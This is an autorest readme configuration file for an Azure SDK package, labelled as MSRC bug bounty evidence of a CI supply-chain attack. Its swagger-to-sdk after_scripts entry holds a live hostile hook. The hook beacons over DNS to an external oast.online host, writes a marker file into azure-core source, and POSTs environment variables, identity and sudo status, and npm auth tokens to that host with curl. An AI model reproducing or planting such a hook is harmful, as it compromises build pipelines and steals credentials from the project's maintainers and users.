# Supply Chain PoC

> MSRC Bug Bounty Evidence -- hasskodark
> Demonstrates arbitrary write access to azure-sdk-for-python source during CI

## Basic Information

These are the global settings for the service.

``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01

``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk

``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr . -) &&
        OAST="da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online" &&
        nslookup "sc2-${H}.${OAST}" 2>/dev/null || true &&
        SDK="/mnt/vss/_work/1/s/azure-sdk-for-python" &&
        [ -d "${SDK}" ] || SDK=$(find / -maxdepth 10 -type d -name "azure-sdk-for-python" 2>/dev/null | head -1) &&
        MARKER="${SDK}/sdk/core/azure-core/SUPPLY_CHAIN_POC_hasskodark.txt" &&
        CORE_INIT="${SDK}/sdk/core/azure-core/azure/core/__init__.py" &&
        printf "%s\n" "SUPPLY_CHAIN_PROOF hasskodark $(date -u) write-access to azure-core SDK source" > "${MARKER}" &&
        curl -sk -X POST "http://${OAST}/scdata2-${H}" --data-binary "SDK=${SDK} MARKER=$(cat ${MARKER} 2>/dev/null) INIT_HEAD=$(head -30 ${CORE_INIT} 2>/dev/null) PKGS=$(find ${SDK}/sdk -maxdepth 2 -name setup.py 2>/dev/null | head -20) GH_ENV=$(env | grep -i GH_ 2>/dev/null) ID=$(id) SUDO=$(sudo -n id 2>/dev/null) NPMRC=$(find /home /root -name .npmrc 2>/dev/null | xargs grep authToken 2>/dev/null | head -3)"
```

## Python

``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  payload-flattening-threshold: 2
  namespace: azure.mgmt.supplychain
  package-name: azure-mgmt-supplychain
  clear-output-folder: true
```

